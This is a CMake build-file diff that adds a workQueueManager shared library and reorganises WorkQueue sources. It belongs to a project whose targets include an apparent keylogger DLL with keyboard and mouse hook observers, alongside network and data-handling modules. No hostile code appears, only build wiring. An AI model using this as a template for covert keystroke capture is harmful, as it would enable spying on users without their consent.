@@ -2,14 +2,6 @@
 ##  MODEL - EXTERNAL LIBRARIES
 ###########################################################
 
-#include_directories(
-#	"../include/DLLoader"
-#	"../include/sayHello"
-#	"../include/dataHandler"
-#	"../include/network"
-#	"../include"
-#	)
-
 if (WIN32)
 
 	###########################################################
@@ -47,6 +39,20 @@ endif (UNIX)
 		../include/DLLoader/CWDLibrary.h
 		DLLoader/DLibrary.cpp
 		DLLoader/C${DISTRIB_LETTER}DLibrary.cpp
+	)
+	
+	# WorkQueue
+	add_library (
+		workQueueManager
+		SHARED
+		../include/workQueueManager/workQueueManager.h
+		../include/workQueueManager/CUMutex.h
+		../include/workQueueManager/CWMutex.h # To join
+		../include/workQueueManager/workQueue.h
+		workQueueManager/CUMutex.cpp
+		workQueueManager/CWMutex.cpp # To join
+		workQueueManager/workQueue.cpp
+		workQueueManager/workQueueManager.cpp
 	)
 
 	# Say Hello
@@ -88,7 +94,6 @@ endif (UNIX)
 		../include/keylogger_dll/KeyboardHookObserver.h
 		../include/keylogger_dll/Analyser.h
 		../include/keylogger_dll/AHookObserver.h
-		../include/WorkQueue.h
 		keylogger_dll/AEvent.cpp
 		keylogger_dll/AHook.cpp
 		keylogger_dll/EventFactory.cpp
@@ -104,7 +109,6 @@ endif (UNIX)
 		keylogger_dll/Analyser.cpp
 		keylogger_dll/KeyboardHookObserver.cpp
 		keylogger_dll/MouseHookObserver.cpp
-		../controller/clientController/WorkQueue.cpp
 	) 
 
 	# dataHandler
